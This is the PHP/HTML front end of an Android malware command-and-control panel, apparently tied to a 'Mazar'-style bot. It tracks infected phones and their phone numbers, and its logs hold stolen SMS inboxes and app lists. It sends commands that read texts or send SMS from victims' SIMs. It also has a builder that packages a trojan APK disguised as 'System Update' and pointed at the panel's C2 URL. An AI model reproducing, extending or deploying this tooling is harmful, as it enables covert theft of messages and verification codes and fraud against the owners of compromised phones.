<?php
require_once __DIR__ . '/../database.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Management Panel</title>
    <link rel="stylesheet" href="css/base.css">
    <link rel="stylesheet" href="css/layout.css">
    <link rel="stylesheet" href="css/components.css">
    <link rel="stylesheet" href="css/tables.css">
</head>
<body>
    <div class="container">
        <header>
            <h1>Device Management Panel</h1>
            <div class="stats">
                <span id="deviceCount">0</span> Devices | 
                <span id="onlineCount" class="online">0</span> Online | 
                <span id="offlineCount" class="offline">0</span> Offline
            </div>
        </header>

        <div class="tabs">
            <button class="tab-button active" onclick="switchTab('devices')">Devices</button>
            <button class="tab-button" onclick="switchTab('logs')">Logs</button>
            <button class="tab-button" onclick="switchTab('builder')">Builder</button>
        </div>

        <div id="devices-tab" class="tab-content active">
            <div class="toolbar">
                <div class="search-box">
                    <input type="text" id="deviceSearch" placeholder="Search devices..." onkeyup="filterDevices()">
                </div>
                <div class="actions">
                    <button onclick="selectAll()" class="btn-secondary">Select All</button>
                    <button onclick="deselectAll()" class="btn-secondary">Deselect All</button>
                    <button id="sendCommandBtn" onclick="showCommandModal()" class="btn-primary" disabled>Send Command</button>
                </div>
            </div>
            <div class="table-container">
                <table id="devicesTable">
                    <thead>
                        <tr>
                            <th><input type="checkbox" id="selectAllCheckbox" onchange="toggleSelectAll()"></th>
                            <th>Android ID</th>
                            <th>Model</th>
                            <th>Phone Numbers</th>
                            <th>Online</th>
                            <th>Command</th>
                        </tr>
                    </thead>
                    <tbody id="devicesTableBody">
                    </tbody>
                </table>
            </div>
            <div class="pagination" id="devicesPagination"></div>
        </div>

        <div id="logs-tab" class="tab-content">
            <div class="toolbar">
                <div class="search-box">
                    <input type="text" id="logSearch" placeholder="Search logs..." onkeyup="filterLogs()">
                </div>
                <div class="filter-box">
                    <select id="logTypeFilter" onchange="filterLogs()">
                        <option value="">All Types</option>
                        <option value="sms_received">SMS Received</option>
                        <option value="getAppsAll_result">Apps Result</option>
                        <option value="getSmsInbox_result">SMS Inbox Result</option>
                    </select>
                </div>
            </div>
            <div class="table-container">
                <table id="logsTable">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Android ID</th>
                            <th>Type</th>
                            <th>Log</th>
                            <th>Time</th>
                        </tr>
                    </thead>
                    <tbody id="logsTableBody">
                    </tbody>
                </table>
            </div>
            <div class="pagination" id="logsPagination"></div>
        </div>

        <div id="builder-tab" class="tab-content">
            <div class="toolbar">
                <h2>APK Builder</h2>
            </div>
            <div class="form-container" style="max-width: 500px; margin: 20px 0; padding: 20px; background: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
                <div class="form-group" style="margin-bottom: 15px;">
                    <label for="apkName" style="display: block; margin-bottom: 5px; font-weight: bold;">APK Filename:</label>
                    <input type="text" id="apkName" value="ClassicBotMazar" placeholder="e.g. MyBot" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
                </div>
                <div class="form-group" style="margin-bottom: 15px;">
                    <label for="appLabel" style="display: block; margin-bottom: 5px; font-weight: bold;">App Name (Label):</label>
                    <input type="text" id="appLabel" value="System Update" placeholder="e.g. Chrome Update" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
                </div>
                <div class="form-group" style="margin-bottom: 15px;">
                    <label for="c2Url" style="display: block; margin-bottom: 5px; font-weight: bold;">C2 URL:</label>
                    <input type="text" id="c2Url" value="http://<?php echo $_SERVER['HTTP_HOST']; ?>/c2/" placeholder="http://your-domain.com/c2/" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
                </div>
                <button onclick="buildApk()" id="buildBtn" class="btn-primary" style="width: 100%;">Build APK</button>
                
                <div id="buildStatus" style="margin-top: 20px; display: none;">
                    <p id="statusMessage" style="font-weight: bold;"></p>
                    <div id="downloadLink" style="display: none; margin-top: 10px;">
                        <a id="apkDownloadBtn" href="#" class="btn-secondary" style="display: inline-block; text-decoration: none; text-align: center;">Download APK</a>
                    </div>
                    <details style="margin-top: 15px;">
                        <summary style="cursor: pointer; color: #666;">View Build Log</summary>
                        <pre id="buildLog" style="background: #f4f4f4; padding: 10px; border-radius: 4px; font-size: 12px; overflow-x: auto; max-height: 300px;"></pre>
                    </details>
                </div>
            </div>
        </div>
    </div>
    </div>

    <div id="commandModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <span class="close" onclick="closeCommandModal()">&times;</span>
                <h2>Send Command</h2>
            </div>
            <div class="modal-body">
                <p id="selectedDevicesInfo"></p>
                <label for="commandSelect">Command:</label>
                <select id="commandSelect" onchange="updateCommandFields()">
                    <option value="">-- Select Command --</option>
                    <option value="getAppsAll">getAppsAll - Get all installed apps</option>
                    <option value="getSmsInbox">getSmsInbox - Get SMS inbox</option>
                    <option value="sendSMS">sendSMS - Send SMS message</option>
                </select>
                
                <div id="sendSMSFields" style="display: none; margin-top: 15px;">
                    <label for="phoneNumber">Phone Number:</label>
                    <input type="text" id="phoneNumber" placeholder="+38000000000">
                    
                    <label for="smsMessage" style="margin-top: 10px;">Message:</label>
                    <textarea id="smsMessage" placeholder="Enter message text..."></textarea>
                    
                    <label for="simSlot" style="margin-top: 10px;">SIM Slot (0 or 1):</label>
                    <input type="number" id="simSlot" value="0" min="0" max="1">
                </div>
            </div>
            <div class="modal-footer">
                <button onclick="closeCommandModal()" class="btn-secondary">Cancel</button>
                <button onclick="sendCommand()" class="btn-primary">Send</button>
            </div>
        </div>
    </div>

    <script src="js/api.js"></script>
    <script src="js/pagination.js"></script>
    <script src="js/deviceCount.js"></script>
    <script src="js/devices.js"></script>
    <script src="js/logs.js"></script>
    <script src="js/tabs.js"></script>
    <script src="js/main.js"></script>
</body>
</html>

